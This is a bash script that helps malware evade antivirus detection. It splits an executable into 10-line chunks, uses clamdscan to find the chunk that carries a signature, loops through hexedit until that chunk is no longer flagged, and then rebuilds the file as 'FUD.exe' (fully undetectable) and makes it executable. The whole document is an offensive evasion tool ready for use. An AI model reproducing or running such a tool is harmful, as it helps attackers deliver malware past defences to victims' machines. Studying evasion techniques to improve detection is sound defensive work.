#!/bin/bash

#DEFINE COLORS

red=$'\e[1;31m'
grn=$'\e[1;32m'
end=$'\e[0m'


printf "\n\t\t********FILE SPLITTING $1*********"
#Defines how many lines of code in malware
LINES="$(wc -l $1 | tr -dc '0-9')"
#Output total lines of code
printf "\n\t\tExecutable contains: $LINES lines of code\n"
printf "\t\tThe splitter will break the executable into \n"
printf "\t\t$LINES different individual files in an attempt\n"
printf "\t\tto find the exact chunk of code being flagged by\n"
printf "\t\tthe signature scanner.....\n"
printf "\t\t"
read -n 1 -s -r -p "Press any button to continue"
#For the first round of splitting, split into files 10 lines long
split -l 10 $1 SPLIT/First_Round_10LINES.
cd root/malware/SPLIT/

#Find what file is being flagged
FoundOne="$(clamdscan First* | grep "FOUND")"
#Parse that to get just file name
FlaggedFile="$(printf "\n\t\t $FoundOne" | rev | cut -d"/" -f 1 | rev | cut -f1 -d":")"
#Print the name of the flagged file

printf "\n\nFlagged File: ${red}$FlaggedFile${end}"

#firstlines=$(wc -l $FlaggedFile | cut -d ' ' -f 1)
printf "\n\n\t\t"
read -p "Open Hexedit to edit flagged portion?(y/n)" selection
case $selection in
   [Yy]*)
   hexedit $FlaggedFile
   while clamdscan $FlaggedFile | grep "FOUND";
   do
      clear
      printf "\n\t\t${red}STILL FLAGGED... TRY AGAIN${end}\n\t\t"
      read -n 1 -s -r -p "Press any key to open hexedit..."
      hexedit $FlaggedFile
   done
   clear
   printf "\n\n\t\t${grn}Congratulations! File succesfully evaded clamscan signature${end}"
   printf "\n\n\t\tRebuilding executable..."
   cat First_Round_10LINES.?? > FUD.exe
   chmod +x FUD.exe
   ;;
   [Nn]*)
   printf "\n\t\texiting..."
   ;;
esac





